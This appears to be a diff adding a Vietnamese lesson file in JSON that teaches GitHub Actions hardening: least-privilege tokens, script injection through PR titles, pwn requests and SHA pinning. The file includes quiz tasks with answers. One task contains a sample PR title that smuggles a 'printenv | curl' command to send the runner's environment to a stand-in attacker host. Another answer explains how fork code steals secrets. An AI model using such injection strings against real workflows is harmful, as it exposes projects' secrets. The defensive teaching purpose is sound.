@@ -1,0 +1,57 @@
+{
+  "id": "C10",
+  "slug": "C10-workflow-security-hardening",
+  "level": 3,
+  "order": 10,
+  "title": "Gia cố Bảo mật Đường ống: GITHUB_TOKEN Tối thiểu, Chống Script Injection, Bẫy Pwn Request & Ghim SHA 40 Ký tự",
+  "summary": "Khoá quyền GITHUB_TOKEN tối thiểu, triệt tiêu lỗ hổng thực thi mã từ xa qua tiêu đề PR (Script Injection), ngăn chặn Pwn Request từ nhánh Fork và ghim cứng SHA 40 ký tự.",
+  "tags": [
+    "security",
+    "least-privilege",
+    "script-injection",
+    "pwn-request",
+    "sha-pinning"
+  ],
+  "sources": [
+    {
+      "title": "Security Hardening for GitHub Actions",
+      "url": "https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions",
+      "version": "GitHub Actions Security Guide 2026"
+    },
+    {
+      "title": "Automatic Token Authentication & Least-Privilege Permissions",
+      "url": "https://docs.github.com/en/actions/security-for-github-actions/security-guides/automatic-token-authentication",
+      "version": "GitHub Actions 2026"
+    }
+  ],
+  "relatedTools": [
+    {
+      "label": "War Room B3: Ứng cứu sự cố lộ Secret",
+      "kind": "warroom",
+      "targetId": "warroom-b3-secret-leak"
+    }
+  ],
+  "readings": [
+    {
+      "path": "security/gha-script-injection-vuln.yml",
+      "kind": "security",
+      "note": "Lỗ hổng RCE kinh điển khi nối trực tiếp biểu thức ${{ github.event.pull_request.title }} vào câu lệnh bash trong run:.",
+      "task": "Giả sử người lạ mở PR với tiêu đề chứa chuỗi `\"; printenv | curl -X POST -d @- https://evil.example.invalid #`, điều gì xảy ra trên Runner?",
+      "answer": "Bộ tiền xử lý chèn nguyên chuỗi đó vào kịch bản trước khi bash chạy, khiến dấu `\";` ngắt câu lệnh echo và thực thi lệnh gửi toàn bộ biến môi trường của Runner ra máy chủ tin tặc."
+    },
+    {
+      "path": "security/gha-script-injection-safe.yml",
+      "kind": "good",
+      "note": "Bản vá triệt để lỗ hổng Script Injection bằng cách đưa dữ liệu không tin cậy từ sự kiện PR vào biến môi trường trung gian env:.",
+      "task": "Tại sao khi truyền qua env: PR_TITLE rồi gọi \"$PR_TITLE\" trong bash, dấu chấm phẩy hay dấu nháy trong tiêu đề PR lại hoàn toàn vô hại?",
+      "answer": "Vì giá trị của biến môi trường được truyền thẳng vào bộ nhớ tiến trình của hệ điều hành chứ không được trình thông dịch bash phân tích lại thành câu lệnh điều khiển mới (giống Parameterized SQL Query)."
+    },
+    {
+      "path": "security/pull-request-target-pwn.yml",
+      "kind": "security",
+      "note": "Thảm hoạ Pwn Request: kết hợp sự kiện pull_request_target đầy quyền hạn với hành động checkout mã nguồn từ nhánh Fork chưa kiểm duyệt rồi chạy npm ci.",
+      "task": "Chỉ ra tại sao chạy npm ci trên mã nguồn Fork trong ngữ cảnh pull_request_target lại làm lộ toàn bộ kho secrets của dự án.",
+      "answer": "Khác với pull_request thông thường, pull_request_target cấp đầy đủ quyền đọc secrets của kho gốc. Khi chạy npm ci trên code của kẻ tấn công, kịch bản postinstall trong package.json được tự động kích hoạt và đọc trọn bộ secrets!"
+    }
+  ]
+}
